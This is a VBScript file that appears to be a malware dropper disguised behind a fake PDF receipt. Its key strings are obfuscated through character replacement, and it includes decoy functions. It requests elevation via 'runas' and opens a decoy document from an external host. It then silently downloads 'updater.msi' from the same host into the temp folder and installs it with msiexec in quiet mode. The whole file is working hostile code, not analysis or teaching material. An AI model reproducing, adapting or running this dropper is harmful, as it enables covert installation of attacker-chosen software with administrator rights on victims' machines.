Option Explicit

Dim objShell, objFSO, strAppHandler, strFSOProvider, httpClient, objStream, tempFolder, strPkgPath, strUpdateURL, strDocURL, strWebHandler, strIOProvider, strInstallerExe, strUnattended, strExecutor, strExecMode, strContext

strAppHandler = Replace("Shell.ApplicXtion", "X", "a")
strFSOProvider = Replace("ScriptJng.FileSystemObject", "J", "i")
strExecutor = Replace("wYcript.exe", "Y", "s")
strExecMode = Replace(Replace("ru!|s", "!", "n"), "|", "a")
strContext = Replace(Replace("@lev^ted", "@", "e"), "^", "a")


Sub ValidateRuntime()
    Dim strVal
    strVal = "6nhh"
    If Len(strVal) < 2 Then Exit Sub
End Sub

Sub DownloadAsset(strURL, ByRef binPayload)
    strWebHandler = Replace(Replace("M~%ML2.ServerXMLHTTP.6.0", "%", "X"), "~", "S")
    Set httpClient = CreateObject(strWebHandler)
    httpClient.setTimeouts 6870, 5607, 10252, 27089
    Dim strVerb : strVerb = Replace("G_E_T", "_", "")
    httpClient.Open strVerb, strURL, False
    Dim intTlsOpt : intTlsOpt = CLng("&H3" & "300")
    Dim intCfgId : intCfgId = 3 - 1
    httpClient.setOption intCfgId, intTlsOpt
    On Error Resume Next
    httpClient.Send
    If Err.Number <> 0 Then WScript.Quit
    On Error GoTo 0
    If httpClient.Status = 200 Then
        binPayload = httpClient.ResponseBody
    Else
        WScript.Quit
    End If
End Sub

Sub DeployPackage(strTarget)
    strInstallerExe = Replace("msiexec.eKe", "K", "x")
    strUnattended = Replace("/Wn", "W", "q")
    Set objShell = CreateObject(strAppHandler)
    objShell.ShellExecute strInstallerExe, "/i """ & strTarget & """ " & strUnattended, "", strExecMode, 1
End Sub


Function GetTimestamp()
    GetTimestamp = Year(Now) & Month(Now) & Day(Now)
End Function

Function CheckService(strName)
    CheckService = True
    If strName = "" Then CheckService = False
End Function


Sub CheckPermissions()
    Dim strCmdArgs
    If Not WScript.Arguments.Named.Exists(strContext) Then
        strCmdArgs = """" & WScript.ScriptFullName & """ /" & strContext
        Set objShell = CreateObject(strAppHandler)
        objShell.ShellExecute strExecutor, strCmdArgs, "", strExecMode, 1
        WScript.Quit
    End If
End Sub

Sub InitContext(intSize)
    If intSize < 1 Then intSize = 58
    Dim i : For i = 1 To intSize : Next
End Sub


Sub LaunchPreview()
    strDocURL = "https://pdfviewer-nu.vercel.app/doc/wureceipt.pdf"
    Set objShell = CreateObject(strAppHandler)
    objShell.ShellExecute strDocURL, "", "", "open", 1
End Sub

Sub PersistData(rawData, strLocalPath)
    strIOProvider = Replace("ADODB.Jtream", "J", "S")
    Dim intDataMode : intDataMode = 2 - 1
    Dim intWriteMode : intWriteMode = Len("AB")
    Set objStream = CreateObject(strIOProvider)
    objStream.Type = intDataMode
    objStream.Open
    objStream.Write rawData
    objStream.SaveToFile strLocalPath, intWriteMode
    objStream.Close
End Sub

' --- Entry Point ---
CheckPermissions

WScript.Sleep 1740
LaunchPreview
WScript.Sleep 1279

Dim binResult
Set objFSO = CreateObject(strFSOProvider)
Dim intFolderType : intFolderType = Len("AB")
tempFolder = objFSO.GetSpecialFolder(intFolderType)
strPkgPath = tempFolder & "\updater.msi"
strUpdateURL = Join(Array("https://pdfviewe", "r-nu.vercel.app/", "doc/updater.msi"), "")

DownloadAsset strUpdateURL, binResult
Dim strBatchId : strBatchId = Year(Now) & "-" & Month(Now) & "-" & Day(Now)
PersistData binResult, strPkgPath
Dim strPhase : strPhase = "ready"
DeployPackage strPkgPath